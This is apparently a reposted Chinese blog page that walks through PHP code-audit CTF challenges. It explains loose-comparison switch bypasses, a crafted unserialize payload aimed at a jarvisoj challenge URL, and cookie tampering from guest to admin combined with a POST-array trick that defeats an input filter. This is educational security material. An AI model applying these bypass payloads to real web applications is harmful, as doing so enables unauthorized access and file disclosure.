+<h2 id="25-switch没有break字符与0比较绕过"><a href="#25-switch没有break字符与0比较绕过" class="headerlink" title="25 switch没有break字符与0比较绕过"></a>25 switch没有break字符与0比较绕过</h2><p>让我们包含当前目录中的<code>flag.php</code>，给<code>which</code>为<code>flag</code>，这里会发现在<code>case 0</code>和<code>case 1</code>的时候，没有<code>break</code>，按照常规思维，应该是<code>0</code>比较不成功，进入比较<code>1</code>，然后比较<code>2</code>，再然后进入<code>default</code>，但是事实却不是这样，事实上，在 <code>case 0</code>的时候，字符串和<code>0</code>比较是相等的，进入了<code>case 0</code>的方法体，但是却没有<code>break</code>，这个时候，默认判断已经比较成功了，而如果匹配成功之后，会继续执行后面的语句，这个时候，是不会再继续进行任何判断的。也就是说，我们<code>which</code>传入<code>flag</code>的时候，<code>case 0</code>比较进入了方法体，但是没有<code>break</code>，默认已经匹配成功，往下执行不再判断，进入<code>2</code>的时候，执行了<code>require_once flag.php</code></p>
+<p><code>PHP</code>中非数字开头字符串和数字<code>0</code>比较<code>==</code>都返回<code>True</code></p>
+<p>因为通过逻辑运算符让字符串和数字比较时，会自动将字符串转换为数字.而当字符串无法转换为数字时，其结果就为<code>0</code>了，然后再和另一个<code>0</code>比大小，结果自然为<code>ture</code>。注意：如果那个字符串是以数字开头的，如<code>6ldb</code>，它还是可以转为数字<code>6</code>的，然后和<code>0</code>比较就不等了（但是和<code>6</code>比较就相等）<br><code>if($str==0)</code> 判断和 <code>if( intval($str) == 0 )</code> 是等价的</p>
+<p>可以验证：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"s6s"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"返回了true."</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>要字符串与数字判断不转类型方法有：</p>
+<ul>
+<li>方法一：</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"字符串"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">"返回了true."</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>方法二：</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"字符串"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">==</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">"返回了true."</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>此题构造：</p>
+<pre><code>http://127.0.0.1/php_bug/25.php?which=aa</code></pre><p>资料：</p>
+<p><a href="https://zhidao.baidu.com/question/336186893.html" target="_blank">PHP中字符串和数字0比较为什么返回true？</a></p>
+<h2 id="26-unserialize-序列化"><a href="#26-unserialize-序列化" class="headerlink" title="26 unserialize()序列化"></a>26 unserialize()序列化</h2><p>说明<code>flag</code>在<code>pctf.php</code>，但<code>showimg.php</code>中不允许直接读取<code>pctf.php</code>，只有在<code>index.php</code>中可以传入变量<code>class</code>，<code>index.php</code>中<code>Shield</code>类的实例<code>$X = unserialize($g)</code>，<code>$g = $_GET[&#39;class&#39;];</code>，<code>$X</code>中不知<code>$filename</code>变量，但需要找的是：<code>$filename = &quot;pctf.php&quot;</code>，现<code>$X</code>已知，求传入的<code>class</code>变量值。<br>可以进行序列化操作：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- answer.php --></span></span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'shield.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">class</span> <span class="token class-name">Shield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$g</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$g</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- shield.php --></span></span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">//flag is in pctf.php</span>
+<span class="token keyword">class</span> <span class="token class-name">Shield</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'pctf.php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> file <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">function</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span>  
+        <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到：</p>
+<pre><code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>构造：</p>
+<pre><code>http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><h2 id="30-利用提交数组绕过逻辑"><a href="#30-利用提交数组绕过逻辑" class="headerlink" title="30 利用提交数组绕过逻辑"></a>30 利用提交数组绕过逻辑</h2><p>首先是给了一个页面，提示<code>Sorry. You have no permissions.</code>。</p>
+<p>查看<code>cookie</code>发现是<code>base64</code>。解密之后替换中间的<code>guest</code>为<code>admin</code>绕过登陆限制。</p>
+<p>这段代码首先会查看提交的请求中是否存在<code>&lt;&gt;</code>如果没有则将传入的数据(如果是数组)转化为字符串。如果其中存在<code>&lt;&gt;</code>则将<code>flag</code>生成在一个随机命名的文件中。<br><code>implode()</code> 这个函数需要传入数组，如果传入的是字符串将报错，变量<code>$s</code>自然也就没有值。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$auth</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'[&lt;>?]'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'No No No!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'[&lt;>?]'</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">"None."</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$tmp</span><span class="token operator">=</span><span class="token string">"./uploads/"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
+            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token string">"your file is in "</span> <span class="token punctuation">.</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"Hello admin, now you can upload something you are easy to forget."</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;br />there are the source.&lt;br />"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">'&lt;textarea rows="10" cols="100">'</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">,</span><span class="token string">'flag{???}'</span><span class="token punctuation">,</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string">'&lt;/textarea>'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="http://pic.storysec.com/2019/phpbugs/30_1.png" alt></p>
+<p>想要通过<code>Post</code>请求的形式传入数组可以使用<code>data[0]=123&amp;data[1]=&lt;&gt;</code>的形式传入数组，这样的话在执行<code>implode()</code>函数的时候就不会使<code>&amp;s</code>为空，成功绕过这段逻辑拿到<code>flag</code>。</p>
+<p><img src="http://pic.storysec.com/2019/phpbugs/30_2.png" alt></p>
+<h2 id="关于转载"><a href="#关于转载" class="headerlink" title="关于转载"></a>关于转载</h2><pre><code>作  者：bowu
+网  站：薄雾&#39;s Blog http://www.bowu8.com
+Github: https://github.com/bowu678/php_bugs</code></pre><p>PS:很值得学习的一篇文章，转载的同时，修复了其中失效的链接。</p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#代码审计" >
+    <span class="tag-code">代码审计</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/JDBC基础学习笔记.html">
+        <span class="nav-arrow">← </span>
+        
+          JDBC基础学习笔记
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/PHP代码审计基础笔记-90sec.html">
+        
+          PHP代码审计基础笔记-90sec
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- No Comment -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#01-extract变量覆盖"><span class="toc-nav-text">01 extract变量覆盖</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#02-绕过过滤的空白字符"><span class="toc-nav-text">02 绕过过滤的空白字符</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#03-多重加密"><span class="toc-nav-text">03 多重加密</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#04-SQL注入-WITH-ROLLUP绕过"><span class="toc-nav-text">04 SQL注入_WITH ROLLUP绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#05-ereg正则-00截断"><span class="toc-nav-text">05 ereg正则%00截断</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#06-strcmp比较字符串"><span class="toc-nav-text">06 strcmp比较字符串</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#07-sha-函数比较绕过"><span class="toc-nav-text">07 sha()函数比较绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#08-SESSION验证绕过"><span class="toc-nav-text">08 SESSION验证绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#09-密码md5比较绕过"><span class="toc-nav-text">09 密码md5比较绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#10-urldecode二次编码绕过"><span class="toc-nav-text">10 urldecode二次编码绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#11-sql闭合绕过"><span class="toc-nav-text">11 sql闭合绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#12-X-Forwarded-For绕过指定IP地址"><span class="toc-nav-text">12 X-Forwarded-For绕过指定IP地址</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#13-md5加密相等绕过"><span class="toc-nav-text">13 md5加密相等绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#14-intval函数四舍五入"><span class="toc-nav-text">14 intval函数四舍五入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#15-strpos数组绕过NULL与ereg正则-00截断"><span class="toc-nav-text">15 strpos数组绕过NULL与ereg正则%00截断</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#16-SQL注入or绕过"><span class="toc-nav-text">16 SQL注入or绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#17-密码md5比较绕过"><span class="toc-nav-text">17 密码md5比较绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#18-md5-函数-使用数组绕过"><span class="toc-nav-text">18 md5()函数===使用数组绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#19-ereg-函数strpos-函数用数组返回NULL绕过"><span class="toc-nav-text">19 ereg()函数strpos() 函数用数组返回NULL绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#20-十六进制与数字比较"><span class="toc-nav-text">20 十六进制与数字比较</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#21-数字验证正则绕过"><span class="toc-nav-text">21 数字验证正则绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#22-弱类型整数大小比较绕过"><span class="toc-nav-text">22 弱类型整数大小比较绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#23-md5函数验证绕过"><span class="toc-nav-text">23 md5函数验证绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#24-md5函数true绕过注入"><span class="toc-nav-text">24 md5函数true绕过注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#25-switch没有break字符与0比较绕过"><span class="toc-nav-text">25 switch没有break字符与0比较绕过</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#26-unserialize-序列化"><span class="toc-nav-text">26 unserialize()序列化</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#30-利用提交数组绕过逻辑"><span class="toc-nav-text">30 利用提交数组绕过逻辑</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#关于转载"><span class="toc-nav-text">关于转载</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'https://storysec.github.io/PHP代码审计分段讲解.html';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+<div align="center">
+    <table width="980" height="35" border="0" align="center">
+        <tr>
+            <td>
+            友情链接：&nbsp;&nbsp;
+            <a target="_blank" href="https://woj.app/">蜗居</a>
+			&nbsp;|&nbsp;
+            <a target="_blank" href="https://mrxn.net">Mrxn</a>
+            &nbsp;|&nbsp;
+            <a target="_blank" href="http://hacktech.cn">Akkuman</a>
+            &nbsp;|&nbsp;
+            <a target="_blank" href="http://www.bugsafe.cn">Poacher</a>
+            &nbsp;|&nbsp;
+            <a target="_blank" href="http://www.se7ensec.cn">Se7en</a>
+            &nbsp;|&nbsp;
+            <a target="_blank" href="https://www.ipz.me/">影乐</a>
+            &nbsp;|&nbsp;
+            <a target="_blank" href="http://www.jiufox.com/">九尾狐</a>
+            &nbsp;|&nbsp;
+            <a target="_blank" href="http://azfashao.com/">爱在发烧</a>
+            &nbsp;|&nbsp;
+            <a target="_blank" href="https://www.web443.com/">Web443</a>
+            &nbsp;|&nbsp;
+            <a target="_blank" href="https://deelmind.cn/">DeeLMind</a>
+            &nbsp;|&nbsp;
+            <a target="_blank" href="http://www.moonsec.com/">暗月</a>
+            &nbsp;|&nbsp;
+            <a target="_blank" href="https://xingqingsafe.github.io/">星晴</a>
+            </td>
+        </tr>
+    </table>
+</div>
+
+<span>
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>|
+<span>
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+  <p class="copyright">
+    &copy; 2019 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng/hexo-theme-vexo" target="_blank">yanm1ng</a>
+  </p>
+
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+<script src="/js/script.js"></script>
+  </body>
+</html>
